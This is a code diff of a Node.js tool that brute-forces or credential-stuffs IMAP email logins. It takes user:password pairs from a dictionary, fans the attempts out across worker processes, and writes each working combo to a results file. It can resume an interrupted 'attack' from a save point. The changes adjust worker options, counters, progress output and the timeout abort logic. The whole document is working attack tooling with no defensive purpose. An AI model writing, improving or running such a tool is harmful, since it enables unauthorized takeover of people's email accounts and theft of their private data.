@@ -2,7 +2,7 @@
 
 import colors from "colors";
 import hashFile from "sha256-file";
-import * as configs from "./imaps.json";
+import configs from "./imaps.js";
 import os from "os";
 import * as Logger from "./Logger";
 import * as IO from "./IO";
@@ -10,21 +10,30 @@ import * as Error from "./Error";
 import * as Prompt from "./Prompt";
 import * as Config from "./Config";
 import workerFarm from "worker-farm";
+import 'babel-polyfill';
 
-let workers = workerFarm(require.resolve("./Worker"));
+const options = {
+  maxCallsPerWorker: 1,
+}
 
+let workers = workerFarm(options, require.resolve("./Worker"));
+
+let counter = 0;
 let selection, dictionary;
-let max, counter, found, countTo;
+var max, found, countTo;
 let unreachbleHost;
 
+max = 0;
+found = 0;
+countTo = 0;
+
 dictionary = null;
-max = counter = found = countTo = 0;
 unreachbleHost = false;
 
 const timedOut = () => {
   console.log(colors.red("[*] Authentification TIMED OUT...") + "\r");
   countTo++;
-  if (countTo >= (max / 100) * 10) {
+  if (countTo >= 100) {
     console.log(colors.red("[*] Timed out too many times aborting attack!"));
     console.log(colors.red("[*] Current progress is " + counter + " / " + max));
     console.log(colors.red("[*] Found " + found + " working combo..."));
@@ -32,7 +41,7 @@ const timedOut = () => {
   }
 };
 
-const connectThen = config => {
+const connectThen = (config) => {
   found++;
   Logger.clear();
   console.log(
@@ -40,11 +49,7 @@ const connectThen = config => {
       "[*] " +
         config.imap.user +
         ":" +
-        config.imap.password +
-        " | " +
-        found +
-        "/" +
-        (counter + 1)
+        config.imap.password
     )
   );
   IO.writeResult(config.imap.user + ":" + config.imap.password + os.EOL);
@@ -59,22 +64,20 @@ const connectCatch = (error, config) => {
         config.imap.user +
         ":" +
         config.imap.password +
-        " | " +
-        found +
-        "/" +
+        ' | ' +
         (counter + 1)
+          + '/' +max
+
     )
   );
   if (error !== null) {
     console.log(colors.red(error.toString()) + "\r");
   }
 
-  if (error.source === "timeout") timedOut();
   if (error.errno === -3008) unreachbleHost = true;
-
   forward();
 };
-const connect = async config => {
+const connect = (config) => {
   // MAKING A SAVE IN CASE OF A TIMEOUT
   workers(config, function(err, config) {
     if (err) connectCatch(err, config);
@@ -83,9 +86,8 @@ const connect = async config => {
 };
 
 const forward = () => {
-  Logger.progressBar.increment();
   counter++;
-  countTo = 0;
+  Logger.progressBar.increment();
 };
 
 const arrayCleaner = () => {
@@ -102,6 +104,7 @@ const arrayCleaner = () => {
   return cleanArray;
 };
 const main = async () => {
+  let index = 0;
   // READING SAVE FILE
 
   const saveData = IO.readSave();
@@ -113,7 +116,7 @@ const main = async () => {
       element.hash === hashFile(dictionary)
     ) {
       found = element.found;
-      counter = element.counter;
+      index = element.counter;
       console.log(
         colors.green(
           "[*] Save has been found!\n[*] Starting back the attack from " +
@@ -128,13 +131,15 @@ const main = async () => {
   const array = arrayCleaner();
   Logger.progressBar.start(max, counter);
   // MAIN LOOP
-  for (counter in array) {
-    let config = Config.get(array[counter], selection);
-    if (config) await connect(config);
+  for (index in array) {
+    let config = Config.get(array[index], selection);
+    if (config) connect(config, index);
     if (unreachbleHost) break;
   }
 
   workerFarm.end(workers, (error, output) => {
+    console.log(error)
+    console.log(output)
     onComplete();
   });
 };
